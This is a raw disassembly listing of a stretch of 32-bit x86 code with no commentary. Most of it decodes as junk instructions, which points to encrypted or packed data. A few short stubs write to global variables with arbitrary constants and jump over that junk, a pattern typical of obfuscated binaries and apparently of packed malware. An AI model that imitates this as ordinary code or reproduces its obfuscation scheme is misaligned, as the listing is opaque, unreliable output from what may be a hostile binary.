  40f29a:	std    
  40f29b:	mov    ebp,0xe6ed3470
  40f2a0:	sub    BYTE PTR [esi+0x35],ch
  40f2a3:	dec    ebp
  40f2a4:	pop    ecx
  40f2a5:	mov    ch,0x66
  40f2a7:	shl    ah,1
  40f2a9:	sbb    ebp,eax
  40f2ab:	pusha  
  40f2ac:	mov    DWORD PTR [eax-0x11b446ea],edi
  40f2b2:	aad    0x13
  40f2b4:	cs nop
  40f2b6:	or     dl,BYTE PTR [edx-0x3ed67d3c]
  40f2bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2bd:	data16 cmc 
  40f2bf:	pushf  
  40f2c0:	sbb    al,0xd6
  40f2c2:	test   DWORD PTR [edx-0x47d446f6],edi
  40f2c8:	std    
  40f2c9:	inc    ebx
  40f2ca:	inc    esi
  40f2cb:	(bad)  [edx-0x1c335506]
  40f2d1:	in     eax,dx
  40f2d2:	scas   eax,DWORD PTR es:[edi]
  40f2d3:	aad    0x43
  40f2d5:	sbb    BYTE PTR [edx-0x42aa3aaa],ch
  40f2db:	pop    esi
  40f2dc:	cmp    eax,DWORD PTR [ebp+0x782166cf]
  40f2e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2e3:	clc    
  40f2e4:	add    bl,ah
  40f2e6:	test   ch,al
  40f2e8:	jno    0x40f30a
  40f2ea:	cmp    eax,0x1f22f7a7
  40f2ef:	stc    
  40f2f0:	fadd   DWORD PTR ds:0xa6c5940f
  40f2f6:	addr16 aad 0xb6
  40f2f9:	or     DWORD PTR [esi+0x5a4ac797],ebx
  40f2ff:	mov    ebp,DWORD PTR [edx]
  40f301:	test   eax,0xa837d5cd
  40f306:	and    ah,BYTE PTR [ebp+ecx*4+0x14]
  40f30a:	popa   
  40f30b:	xchg   ecx,eax
  40f30c:	cli    
  40f30d:	add    eax,0xc0e7ddb9
  40f312:	fld    DWORD PTR [ecx-0x50]
  40f315:	push   ecx
  40f316:	pop    esi
  40f317:	mov    ebp,0xae888d4c
  40f31c:	cmp    BYTE PTR [ecx],dl
  40f31e:	outs   dx,DWORD PTR ds:[esi]
  40f31f:	fisttp DWORD PTR [ebx+0x1c]
  40f322:	retf   0x101
  40f325:	and    ch,ch
  40f327:	ins    DWORD PTR es:[edi],dx
  40f328:	sub    ebx,esp
  40f32a:	std    
  40f32b:	adc    eax,0xc43ef385
  40f330:	stos   DWORD PTR es:[edi],eax
  40f331:	in     al,0xc0
  40f333:	sub    eax,0x9cd79975
  40f338:	imul   ebx,DWORD PTR [esi],0x65
  40f33b:	retfw  0xcfc4
  40f33f:	out    0x5a,al
  40f341:	outs   dx,BYTE PTR ds:[esi]
  40f342:	inc    edx
  40f343:	mov    bh,0xc
  40f345:	dec    ebp
  40f346:	nop
  40f347:	xor    al,0xe3
  40f34a:	xor    eax,ecx
  40f34c:	pop    edi
  40f34d:	mov    ?,esi
  40f34f:	shr    BYTE PTR [edx+0x260a5547],1
  40f355:	dec    ecx
  40f356:	test   al,0x5e
  40f358:	lods   eax,DWORD PTR ds:[esi]
  40f359:	inc    edi
  40f35a:	or     al,0x37
  40f35c:	stc    
  40f35d:	test   dh,al
  40f35f:	shl    BYTE PTR [edx],0x9c
  40f362:	mov    ?,eax
  40f364:	inc    esi
  40f365:	loopne 0x40f344
  40f367:	push   ss
  40f368:	mov    al,0x77
  40f36a:	mov    ah,0x7d
  40f36c:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40f36e:	leave  
  40f36f:	xor    BYTE PTR [ecx],bl
  40f371:	mov    ch,0x13
  40f373:	cmp    bh,BYTE PTR [eax+eax*1]
  40f376:	jp     0x40f380
  40f378:	pop    es
  40f379:	test   al,0xdb
  40f37b:	shr    BYTE PTR ds:0x85ec3e3d,cl
  40f381:	mov    ds:0xa82dd8ab,eax
  40f386:	mov    ebp,0x2b8144d1
  40f38b:	xchg   esi,eax
  40f38c:	and    DWORD PTR [edx+0x5573ac86],ebp
  40f392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f393:	arpl   WORD PTR [ecx-0x47],ax
  40f396:	adc    al,0x80
  40f398:	xor    BYTE PTR [ebx],cl
  40f39a:	inc    esi
  40f39b:	mov    edx,0xe97f9ab8
  40f3a0:	inc    eax
  40f3a1:	data16 sbb al,0x1
  40f3a4:	jl     0x40f35d
  40f3a6:	or     eax,0x657a0462
  40f3ab:	lods   al,BYTE PTR ds:[esi]
  40f3ac:	xchg   edx,eax
  40f3ad:	jge    0x40f369
  40f3af:	xor    esi,esi
  40f3b1:	adc    al,0xe1
  40f3b3:	(bad)
  40f3b7:	or     eax,0xa55e6ce8
  40f3bc:	mov    edi,0xdfdf5a23
  40f3c1:	fcomp  QWORD PTR [ecx+0x3d8db8d]
  40f3c7:	and    al,BYTE PTR [ebp+0x67]
  40f3ca:	pop    edi
  40f3cb:	popf   
  40f3cc:	cli    
  40f3cd:	mov    eax,ds:0x1ec1f8cb
  40f3d2:	xchg   edx,eax
  40f3d3:	mov    eax,0x4d43506d
  40f3d8:	ret    0x6722
  40f3db:	pop    eax
  40f3dc:	aam    0xfc
  40f3de:	jo     0x40f371
  40f3e0:	push   es
  40f3e1:	cmp    eax,0x9269b3f
  40f3e6:	push   ds
  40f3e7:	das    
  40f3e8:	jge    0x40f38f
  40f3ea:	pop    esp
  40f3eb:	ficomp DWORD PTR [ebx-0x18]
  40f3ee:	push   0xffffffbd
  40f3f0:	xchg   ecx,eax
  40f3f1:	popa   
  40f3f2:	ja     0x40f3b1
  40f3f4:	xor    dl,BYTE PTR [esi-0x2a]
  40f3f7:	test   BYTE PTR [esi+0x3],bl
  40f3fa:	ret    
  40f3fb:	pop    ebx
  40f3fc:	leave  
  40f3fd:	ret    0x8
  40f400:	push   ebp
  40f401:	mov    ebp,esp
  40f403:	push   ecx
  40f404:	mov    DWORD PTR ds:0x433827,0x6a14
  40f40e:	push   ecx
  40f40f:	xor    ecx,edx
  40f411:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40f418:	jmp    0x40f6e7
  40f41d:	call   0xa1f0:0x6df6cd0b
  40f424:	push   ebx
  40f425:	inc    ebx
  40f426:	push   edi
  40f427:	dec    ecx
  40f428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f429:	sbb    DWORD PTR [eax],esi
  40f42b:	jge    0x40f3d8
  40f42d:	scas   eax,DWORD PTR es:[edi]
  40f42e:	stos   DWORD PTR es:[edi],eax
  40f42f:	jle    0x40f4af
  40f431:	lods   al,BYTE PTR ds:[esi]
  40f432:	jl     0x40f4b2
  40f434:	jle    0x40f40e
  40f436:	adc    BYTE PTR [ecx+0x50c51534],al
  40f43c:	ret    0x66b7
  40f43f:	nop
  40f440:	dec    edx
  40f441:	mov    edx,0x592748ba
  40f446:	fbstp  TBYTE PTR [edx+0x111add73]
  40f44c:	adc    ch,BYTE PTR [eax-0x36]
  40f44f:	jnp    0x40f4ac
  40f451:	inc    eax
  40f452:	(bad)  
  40f454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f455:	shr    BYTE PTR [ebx-0x59],0xf1
  40f459:	shld   DWORD PTR ds:0x662499ca,ecx,cl
  40f460:	dec    esi
  40f461:	xor    eax,0xf1f32420
  40f466:	push   0xe63961a3
  40f46b:	lds    edx,FWORD PTR [edi-0x5f083e67]
  40f471:	add    DWORD PTR [edi+0x7b],eax
  40f474:	js     0x40f4b5
  40f476:	ret    0xaafc
  40f479:	xor    eax,0x3f2882b7
  40f47e:	aaa    
  40f47f:	jae    0x40f479
  40f481:	xor    al,0x3d
  40f483:	std    
  40f484:	fcom   QWORD PTR [edi+0x26693cb4]
  40f48a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f48b:	(bad)  
  40f48d:	and    BYTE PTR [esi+0x9],ah
  40f490:	push   ecx
  40f491:	cmc    
  40f492:	fnsave [edx+0x76b5b4db]
  40f498:	cs loop 0x40f4ee
  40f49b:	lea    edx,[esp+edi*2+0x2302ab8a]
  40f4a2:	jecxz  0x40f42a
  40f4a4:	mov    ebx,0xbb3eb62e
  40f4a9:	push   eax
  40f4aa:	push   eax
  40f4ab:	push   0xe28ef5d9
  40f4b0:	gs push ecx
  40f4b2:	lock fs mov al,0xc8
  40f4b6:	pop    ebp
  40f4b7:	mov    ebx,0xfc2bf513
  40f4bc:	xchg   esi,eax
  40f4bd:	jbe    0x40f4eb
  40f4bf:	mov    ah,0xe9
  40f4c1:	dec    esi
  40f4c2:	and    al,0x30
  40f4c4:	and    edi,esp
  40f4c6:	mov    ah,0x43
  40f4c8:	dec    ecx
  40f4c9:	(bad)  
  40f4ca:	mov    ch,0x78
  40f4cc:	shr    BYTE PTR [ecx],1
  40f4ce:	xor    eax,DWORD PTR [eiz*4+0x4ee32bc]
  40f4d5:	out    0x5f,al
  40f4d7:	(bad)  
  40f4d9:	push   eax
  40f4da:	cdq    
  40f4db:	in     eax,dx
  40f4dc:	sub    dh,al
  40f4de:	add    DWORD PTR [eax+edx*8-0x6c],esp
  40f4e2:	jg     0x40f52a
  40f4e4:	in     al,dx
  40f4e5:	cmp    dl,BYTE PTR [edi-0x2d81dbc0]
  40f4eb:	shl    DWORD PTR [ebp+0x1f3b78b8],cl
  40f4f1:	mov    bh,0xe4
  40f4f3:	mov    dl,0xba
  40f4f5:	jne    0x40f49d
  40f4f7:	into   
  40f4f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4f9:	fdivrp st(0),st
  40f4fb:	leave  
  40f4fc:	sub    al,0x35
  40f4fe:	fisub  DWORD PTR [edx-0x4eeef27]
  40f504:	(bad)
  40f507:	rcr    ch,cl
  40f509:	js     0x40f550
  40f50b:	sbb    bl,BYTE PTR [ebx-0x56e300f3]
  40f511:	mov    dh,0xd2
  40f513:	stos   BYTE PTR es:[edi],al
  40f514:	dec    esi
  40f515:	hlt    
  40f516:	dec    ebp
  40f517:	mul    DWORD PTR [edx+0x2b]
  40f51a:	sbb    ebp,DWORD PTR [ebp-0x2f]
  40f51d:	pushf  
  40f51e:	call   0xedf91871
  40f523:	inc    esp
  40f524:	jecxz  0x40f52f
  40f526:	mov    al,ds:0x39627a3c
  40f52b:	jo     0x40f4d5
  40f52d:	add    eax,0x448928c8
  40f532:	jns    0x40f50e
  40f534:	(bad)  
  40f535:	out    dx,al
  40f536:	nop
  40f537:	dec    edx
  40f538:	jmp    0x191b49d6
  40f53d:	leave  
  40f53e:	and    BYTE PTR [esi],al
  40f540:	iret   
  40f541:	xchg   DWORD PTR [edi+0x1344cda],esp
  40f547:	sti    
  40f548:	aas    
  40f549:	icebp  
  40f54a:	loop   0x40f4e9
  40f54c:	push   edi
  40f54d:	fidivr WORD PTR [ebx+0x5030b9a1]
  40f553:	mov    bh,0x2e
  40f555:	popa   
  40f556:	mov    edx,0xbbbe3405
  40f55b:	ins    BYTE PTR es:[edi],dx
  40f55c:	daa    
  40f55d:	cmp    dl,0x11
  40f560:	jl     0x40f5a9
  40f562:	sub    ch,dh
  40f564:	sbb    al,BYTE PTR [edx+edi*8+0x5db4734b]
  40f56b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f56c:	aaa    
  40f56d:	test   DWORD PTR [edi+ecx*8-0x41],ebx
  40f571:	imul   esi,DWORD PTR [ecx+eax*1+0x22],0x401dc1f2
  40f579:	mov    bl,0x6
  40f57b:	repnz mov eax,ds:0x4c6c2554
  40f581:	pop    edx
  40f582:	jnp    0x40f578
  40f584:	inc    edi
  40f585:	rol    BYTE PTR [edx],0x9c
  40f588:	pop    ebx
  40f589:	pop    ds
  40f58a:	sub    esp,DWORD PTR [ebx]
  40f58c:	rcr    ebp,0x66
  40f58f:	xor    al,0x60
  40f591:	loope  0x40f566
  40f593:	push   ds
  40f594:	mov    al,ds:0xd75ca3cb
  40f599:	es xor eax,0x951d8584
  40f59f:	add    BYTE PTR [edi],0xbd
  40f5a2:	and    al,0xa9
  40f5a4:	jmp    0x40f5b8
  40f5a6:	test   BYTE PTR [edx],bl
  40f5a8:	aas    
  40f5a9:	pushf  
  40f5aa:	sbb    edx,ecx
  40f5ac:	outs   dx,DWORD PTR ds:[esi]
  40f5ad:	sub    al,0xdf
  40f5af:	dec    edi
  40f5b0:	div    BYTE PTR [ecx-0x18]
  40f5b3:	clc    
  40f5b4:	ja     0x40f577
  40f5b6:	mov    esi,0x56a190a
  40f5bb:	sub    BYTE PTR [esi-0x42bc1c2c],cl
  40f5c1:	lods   al,BYTE PTR ds:[esi]
  40f5c2:	rol    DWORD PTR [edx],1
  40f5c4:	rcl    DWORD PTR [edi+0x215c16e5],0xd4
  40f5cb:	jo     0x40f5e9
  40f5cd:	int    0x12
  40f5cf:	cmp    al,0xfb
  40f5d1:	ja     0x40f61c
  40f5d3:	iret   
  40f5d4:	in     eax,dx
  40f5d5:	into   
  40f5d6:	vmaxss xmm7,xmm5,DWORD PTR [ecx+0x4a]
  40f5db:	loopne 0x40f615
  40f5dd:	mov    bl,0x1d
  40f5df:	(bad)  
  40f5e0:	jecxz  0x40f608
  40f5e2:	mov    ds:0x86ef37c9,al
  40f5e7:	mov    eax,ds:0xbf2b06bd
  40f5ec:	mov    edi,0x89256f2d
  40f5f1:	btr    DWORD PTR [edi+ecx*8+0x6f],0x93
  40f5f7:	shl    DWORD PTR [ebx-0x496cde1],1
  40f5fd:	inc    esi
  40f5fe:	repnz fisttp DWORD PTR [edi]
  40f601:	fist   WORD PTR [edi+0x10]
  40f604:	loop   0x40f5d4
  40f606:	pushf  
  40f607:	mov    esp,0x7ba7a820
  40f60c:	or     DWORD PTR [ebp+0x7d],edi
  40f60f:	outs   dx,BYTE PTR ds:[esi]
  40f610:	add    al,dh
  40f612:	mov    eax,0x6d7b2b9f
  40f617:	jae    0x40f5f4
  40f619:	in     al,dx
  40f61a:	lea    esi,[edx-0x11c1a0c1]
  40f620:	xchg   ecx,eax
  40f621:	jecxz  0x40f627
  40f623:	sub    ebp,DWORD PTR [ebp+0x76]
  40f626:	pop    ebp
  40f627:	call   0x6e06:0x2895dde6
  40f62e:	xor    eax,ebx
  40f630:	cmp    ecx,DWORD PTR [ebx-0x15a44444]
  40f636:	mov    bl,0x39
  40f638:	int3   
  40f639:	lea    ebp,[ecx+eiz*2]
  40f63c:	into   
  40f63d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f63e:	es (bad) 
  40f640:	cli    
  40f641:	and    ah,dl
  40f643:	mov    ebp,0xedb3a6c
  40f648:	std    
  40f649:	push   esp
  40f64a:	sbb    al,0xa5
  40f64c:	sub    dh,BYTE PTR [ecx+0x19b3d5cd]
  40f652:	pop    esi
  40f653:	adc    edx,esp
  40f655:	(bad)  
  40f656:	cmc    
  40f657:	mov    bh,0x3e
  40f659:	jae    0x40f67e
  40f65b:	sbb    eax,0x48f531be
  40f660:	aad    0x68
  40f662:	add    DWORD PTR [esi-0x35],edx
  40f665:	cmovno ecx,DWORD PTR [ebp-0x350da9d8]
  40f66c:	mov    ecx,0x937a6692
  40f671:	das    
  40f672:	idiv   bh
  40f674:	xchg   edx,eax
  40f675:	fdiv   QWORD PTR [ebx+0x4f]
  40f678:	les    ebx,FWORD PTR [esi]
  40f67a:	pop    ebp
  40f67b:	rcl    DWORD PTR [edi+0x7d],1
  40f67e:	pop    es
  40f67f:	in     al,0xcd
  40f681:	push   es
  40f682:	adc    eax,0x7ff12bda
  40f687:	mov    ch,0xb
  40f689:	idiv   DWORD PTR [esp+ecx*4+0x15]
  40f68d:	outs   dx,DWORD PTR ds:[esi]
  40f68e:	in     eax,dx
  40f68f:	test   al,0x90
  40f691:	pop    esp
  40f692:	jae    0x40f6d3
  40f694:	push   0xffffffaa
  40f696:	repz out dx,al
  40f698:	dec    edx
  40f699:	pop    esp
  40f69a:	lock aas 
  40f69c:	jb     0x40f6f5
  40f69e:	or     BYTE PTR [esi-0x4badad08],al
  40f6a4:	lods   al,BYTE PTR ds:[esi]
  40f6a5:	and    al,0xa0
  40f6a7:	xchg   edx,eax
  40f6a8:	in     eax,dx
  40f6a9:	mov    cl,BYTE PTR [edi]
  40f6ab:	xlat   BYTE PTR ds:[ebx]
  40f6ac:	scas   al,BYTE PTR es:[edi]
  40f6ad:	dec    edx
  40f6ae:	mov    ds:0x6f90d060,al
  40f6b3:	imul   ecx,edx,0x61
  40f6b6:	ja     0x40f6a2
  40f6b8:	inc    esp
  40f6b9:	mov    ds:0x9c05427c,al
  40f6be:	mov    eax,ds:0x1e290899
  40f6c3:	enter  0xbd5,0xee
  40f6c7:	mov    esi,0xfc09da73
  40f6cc:	xchg   esp,eax
  40f6cd:	or     al,0x69
  40f6cf:	fisttp WORD PTR ss:[esi-0x7d06e2d8]
  40f6d6:	jno    0x40f6eb
  40f6d8:	mov    bh,0x8
  40f6da:	or     cl,BYTE PTR [ecx]
  40f6dc:	mov    al,0x73
  40f6de:	cmp    edx,ebp
  40f6e0:	retf   
  40f6e1:	test   al,ch
  40f6e3:	adc    eax,esp
  40f6e5:	mov    dh,0x22
  40f6e7:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f6ee:	sub    DWORD PTR ds:0x433827,0x5c72
  40f6f8:	mov    eax,DWORD PTR [ebp-0x4]
  40f6fb:	add    DWORD PTR ds:0x4337e7,0x767c
  40f705:	jmp    0x40f9d4
  40f70a:	ins    BYTE PTR es:[edi],dx
  40f70b:	xchg   BYTE PTR [eax+0x70d870dc],ah
  40f711:	xchg   esi,eax
  40f712:	in     eax,0xdf
  40f714:	or     eax,ebp
  40f716:	add    BYTE PTR [ebx-0x49229356],cl
  40f71c:	jle    0x40f79c
  40f71e:	lods   al,BYTE PTR ds:[esi]
  40f71f:	jl     0x40f79f
  40f721:	jle    0x40f75a
  40f723:	push   esi
  40f724:	xchg   BYTE PTR [ebx-0x2b4d8fd2],bl
  40f72a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f72b:	adc    ecx,ebp
  40f72d:	inc    edx
  40f72e:	les    ebp,FWORD PTR [edi]
  40f730:	push   esi
  40f731:	mov    esi,0x46ec8646
  40f736:	push   ecx
  40f737:	mov    bl,0x71
  40f739:	xchg   ecx,eax
  40f73a:	xlat   BYTE PTR ds:[ebx]
  40f73b:	mov    ds:0x4cd9c560,eax
  40f740:	(bad)  
  40f741:	mov    WORD PTR [ebp-0x781ab31d],gs
  40f747:	pop    es
  40f748:	inc    esp
  40f749:	stos   DWORD PTR es:[edi],eax
  40f74a:	and    eax,DWORD PTR [edx+0x72]
  40f74d:	nop
  40f74e:	fprem  
  40f750:	mov    cl,0x43
  40f752:	cld    
  40f753:	mov    edx,0x86feaa6a
  40f758:	pop    ecx
  40f759:	and    ecx,DWORD PTR [edi-0x32e20a3d]
  40f75f:	jo     0x40f709
  40f761:	retf   0xd770
  40f764:	call   0xc638:0x8ae6302
  40f76b:	test   cl,al
  40f76d:	mov    dh,0xb8
  40f76f:	jo     0x40f79d
  40f771:	sub    cl,BYTE PTR [ebp+0x40703615]
  40f777:	push   ss
  40f778:	sbb    al,BYTE PTR [edi+ebx*1+0x2a]
  40f77c:	leave  
  40f77d:	mov    ah,0xb6
  40f77f:	scas   eax,DWORD PTR es:[edi]
  40f780:	lea    esi,[ebp+0x65301ed4]
  40f786:	arpl   WORD PTR [ebp-0x749b2701],bp
  40f78c:	mov    al,0xc9
  40f78e:	mov    edi,DWORD PTR [eax]
  40f790:	adc    dl,BYTE PTR [esi-0x45]
  40f793:	jecxz  0x40f745
  40f795:	jne    0x40f7f1
  40f797:	out    dx,eax
  40f798:	test   al,0xfe
  40f79a:	jnp    0x40f775
  40f79c:	lds    eax,FWORD PTR [edi]
  40f79e:	xchg   ecx,eax
  40f79f:	pushf  
  40f7a0:	inc    edx
  40f7a1:	rcr    BYTE PTR [edi-0xf9b6fba],cl
  40f7a7:	add    al,0x81
  40f7a9:	in     al,dx
  40f7aa:	sbb    esp,DWORD PTR [edi]
  40f7ac:	xchg   esi,eax
  40f7ad:	sbb    DWORD PTR [ecx+0x26],0x44beba74
  40f7b4:	cmp    DWORD PTR [si],esp
  40f7b7:	mov    eax,edx
  40f7b9:	aaa    
  40f7ba:	jae    0x40f82f
  40f7bc:	sti    
  40f7bd:	pop    edi
  40f7be:	clc    
  40f7bf:	(bad)  
  40f7c0:	sub    DWORD PTR [ebp-0x666ccd9e],ecx
  40f7c6:	ret    0xdb82
  40f7c9:	hlt    
  40f7ca:	dec    cl
  40f7cc:	mov    dh,0x7c
  40f7ce:	paddsw mm6,QWORD PTR [ebp+0x47140a6d]
  40f7d5:	mov    eax,0x84014583
  40f7da:	shl    DWORD PTR [esp+ebp*8-0x6981b316],cl
  40f7e1:	add    eax,DWORD PTR [ecx-0x5cb1be3d]
  40f7e7:	xor    bl,BYTE PTR [edi*1-0x18fdb8ff]
  40f7ee:	jecxz  0x40f77d
  40f7f0:	stos   DWORD PTR es:[edi],eax
  40f7f1:	jae    0x40f7cb
  40f7f3:	push   ss
  40f7f4:	xchg   BYTE PTR [esi+ebp*1],al
  40f7f7:	inc    eax
  40f7f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7f9:	push   eax
  40f7fa:	inc    edx
  40f7fb:	add    ebx,DWORD PTR [ebx+ebx*1]
  40f7fe:	addr16 jle 0x40f829
  40f801:	push   edx
  40f802:	js     0x40f78a
  40f804:	cmp    ebp,DWORD PTR [esp+edx*1]
  40f807:	fwait
  40f808:	dec    ebx
  40f809:	mov    dh,0x45
  40f80b:	pusha  
  40f80c:	int3   
  40f80d:	add    BYTE PTR [edx-0x8],dh
  40f810:	pop    ds
  40f811:	arpl   WORD PTR [eax+0x1a064d54],ax
  40f817:	adc    BYTE PTR [edx-0x77],bh
  40f81a:	xchg   esp,eax
  40f81b:	fnsave [edi-0x43]
  40f81e:	out    dx,eax
  40f81f:	dec    ebp
  40f820:	cmp    BYTE PTR [eax+0x41b80156],ah
  40f826:	adc    ecx,DWORD PTR [ebx+0x4b]
  40f829:	jbe    0x40f86e
  40f82b:	hlt    
  40f82c:	ss push 0x4e4e3717
  40f832:	retf   
  40f833:	add    dh,dh
  40f835:	jns    0x40f7d6
  40f837:	push   es
  40f838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f839:	repz cdq 
  40f83b:	sahf   
  40f83c:	push   esp
  40f83d:	cmp    eax,0x76c0a40a
  40f842:	outs   dx,BYTE PTR ds:[esi]
  40f843:	fldcw  WORD PTR [esi+0x27]
  40f846:	lea    edi,[esi+0x15]
  40f849:	(bad)  
  40f84b:	clc    
  40f84c:	adc    BYTE PTR [ebp-0x4276c765],cl
  40f852:	jo     0x40f7ef
  40f854:	mov    bh,0x5e
  40f856:	xor    eax,0xd75e0b1c
  40f85b:	xor    ecx,DWORD PTR [ebp+ebx*2-0x48170b83]
  40f862:	push   ss
  40f863:	add    bh,BYTE PTR [ecx+esi*4+0x30]
  40f867:	out    0xb,eax
  40f869:	ret    0x7a26
  40f86c:	xor    DWORD PTR [esi-0x635c524],ebx
  40f872:	add    al,BYTE PTR [ecx]
  40f874:	loopne 0x40f84d
  40f876:	jg     0x40f857
  40f878:	inc    ebx
  40f879:	mov    eax,0x96dbdd1e
  40f87e:	out    0x9e,eax
  40f880:	into   
  40f881:	adc    ah,BYTE PTR [esi-0x49]
  40f884:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f885:	adc    bh,BYTE PTR [ecx+0x26]
  40f888:	cmp    BYTE PTR [bx+di-0x7da6],ch
  40f88d:	xchg   esp,eax
  40f88e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f88f:	lock xor DWORD PTR [ebx],ecx
  40f892:	in     eax,0x6
  40f894:	outs   dx,DWORD PTR ds:[esi]
  40f895:	out    dx,al
  40f896:	outs   dx,BYTE PTR ds:[esi]
  40f897:	mov    cl,BYTE PTR [eax]
  40f899:	inc    esi
  40f89a:	pop    ss
  40f89b:	pop    esi
  40f89c:	jg     0x40f91d
  40f89e:	pop    edi
  40f89f:	and    DWORD PTR [ecx],edi
  40f8a1:	mov    ebx,0x4b645460
  40f8a6:	add    DWORD PTR [ecx+ecx*2+0x66],esi
  40f8aa:	mov    DWORD PTR [eax+0xf73490e],ecx
  40f8b0:	adc    BYTE PTR [ecx+eiz*2],0x3f
  40f8b4:	sbb    BYTE PTR [ecx+0x60783d1b],cl
  40f8ba:	cmc    
  40f8bb:	adc    al,0x2c
  40f8bd:	adc    al,0x11
  40f8bf:	cdq    
  40f8c0:	imul   ebx,DWORD PTR [ebp-0x29],0xb6045e3b
  40f8c7:	ror    DWORD PTR [ecx+0x4a1fdbbb],cl
  40f8cd:	mov    esi,0x2ed04d09
  40f8d2:	mov    ds:0x4fff1515,al
  40f8d7:	pop    eax
  40f8d8:	sub    dl,BYTE PTR [edx+0x52]
  40f8db:	out    0xb7,eax
  40f8dd:	push   ecx
  40f8de:	xchg   ecx,eax
  40f8df:	inc    edx
  40f8e0:	mov    esp,0x7f3752
  40f8e5:	push   esi
  40f8e6:	fiadd  DWORD PTR [edi-0x3b]
  40f8e9:	mov    esp,0xa4ed836f
  40f8ee:	test   al,0x96
  40f8f0:	xchg   DWORD PTR [ebx+0xa],esi
  40f8f3:	dec    ebx
  40f8f4:	dec    esi
  40f8f5:	outs   dx,BYTE PTR ds:[esi]
  40f8f6:	outs   dx,BYTE PTR ds:[esi]
  40f8f7:	add    ah,BYTE PTR [edx+0x66]
  40f8fa:	sbb    ebx,ebp
  40f8fc:	cmp    eax,0x42b6b198
  40f901:	daa    
  40f902:	dec    edi
  40f903:	pop    ds
  40f904:	aam    0x6c
  40f906:	dec    esi
  40f907:	fild   QWORD PTR ds:0x56859186
  40f90d:	or     bh,dl
  40f90f:	in     eax,0xf7
  40f911:	or     ecx,DWORD PTR [esi]
  40f913:	int    0xbb
  40f915:	fstp   QWORD PTR [ecx+0x478b38c6]
  40f91b:	addr16 xor al,0xde
  40f91e:	sbb    ch,0x1d
  40f921:	test   esi,esi
  40f923:	test   BYTE PTR [edx+0x144e2d2a],0xfd
  40f92a:	imul   esi,DWORD PTR [edi],0x694a37a5
  40f930:	mov    bh,0x3a
  40f932:	or     al,0xfc
  40f934:	pop    ebp
  40f935:	rcl    DWORD PTR [eax-0x162633df],1
  40f93b:	mov    ch,BYTE PTR [eax]
  40f93d:	pushf  
  40f93e:	shl    DWORD PTR [eax+edi*8],0x2d
  40f942:	xor    eax,0x1f694f94
  40f947:	and    BYTE PTR [esi-0x1978fbd6],ah
  40f94d:	push   edi
  40f94e:	neg    BYTE PTR [edx-0x5]
  40f951:	sub    edx,DWORD PTR [edi+0x1ec0c759]
  40f957:	ret    
  40f958:	ss shr bh,0x46
  40f95c:	les    ecx,FWORD PTR [esi+0x9]
  40f95f:	ds mov ebp,0xd3f1728c
  40f965:	loopne 0x40f8ed
  40f967:	rcr    BYTE PTR [ecx],0x3b
  40f96a:	mov    al,ds:0x4792cda5
  40f96f:	inc    edi
  40f970:	mov    ds:0xc1524768,eax
  40f975:	mov    esi,0x5a1d9f42
  40f97a:	push   cs
  40f97b:	gs mul bh
  40f97e:	push   ebp
  40f97f:	cwde   
  40f980:	xchg   BYTE PTR [esi-0x7cb60942],dh
  40f986:	cmp    dl,al
  40f988:	add    cl,BYTE PTR [edi+0x5b7821fe]
  40f98e:	or     DWORD PTR [ebx+edi*1+0x1c],0x1695691
  40f996:	adc    eax,0x8c94f387
  40f99b:	push   0xffffffc6
  40f99d:	mov    ecx,DWORD PTR [eiz*4-0x105e4e02]
  40f9a4:	(bad)  
  40f9a5:	lods   al,BYTE PTR ds:[esi]
  40f9a6:	jbe    0x40f94c
  40f9a8:	pop    ebx
  40f9a9:	retf   
  40f9aa:	(bad)  
  40f9ab:	adc    ch,BYTE PTR [ebx]
  40f9ad:	js     0x40fa09
  40f9af:	pop    ds
  40f9b0:	mov    ds:0x73ba5029,eax
  40f9b5:	inc    dh
  40f9b7:	lods   eax,DWORD PTR ds:[esi]
  40f9b8:	dec    edx
  40f9b9:	jbe    0x40fa1e
  40f9bb:	sub    al,0x82
  40f9bd:	mov    edi,0x5fabc2ec
  40f9c2:	daa    
  40f9c3:	sub    ecx,DWORD PTR [ecx-0x19856f6b]
  40f9c9:	(bad)  
  40f9ca:	cs push eax
  40f9cc:	xor    DWORD PTR [edi+esi*8-0x69],0x7f598cf6
  40f9d4:	push   esi
  40f9d5:	adc    esi,DWORD PTR ds:0x433777
  40f9db:	mov    esi,DWORD PTR [ebp-0x8]
  40f9de:	movzx  ecx,BYTE PTR ds:0x43377b
  40f9e5:	adc    DWORD PTR ds:0x433833,ecx
  40f9eb:	mov    edx,0x7510854
  40f9f0:	xor    eax,edx
  40f9f2:	xor    ecx,0x76d3
  40f9f8:	xor    esi,edx
  40f9fa:	mov    ecx,0x32729b
  40f9ff:	jmp    0x40fcce
  40fa04:	mov    eax,ds:0x696d6976
  40fa09:	jno    0x40f9ac
  40fa0b:	jb     0x40fa43
  40fa0d:	inc    eax
  40fa0e:	pop    eax
  40fa0f:	outs   dx,DWORD PTR ds:[esi]
  40fa10:	adc    al,0x30
  40fa12:	in     al,dx
  40fa13:	mov    ch,0xb
  40fa15:	mov    ch,0x7e
  40fa17:	jle    0x40f9c5
  40fa19:	jl     0x40fa99
  40fa1b:	jle    0x40fa27
  40fa1d:	fwait
  40fa1e:	mov    es,WORD PTR [edx-0xc]
  40fa21:	pop    esi
  40fa22:	pop    eax
  40fa23:	add    dh,bl
  40fa25:	mov    eax,ds:0x76865d73
  40fa2a:	lods   al,BYTE PTR ds:[esi]
  40fa2b:	xor    eax,0xe16b672a
  40fa30:	sub    DWORD PTR [edx],ebp
  40fa32:	popf   
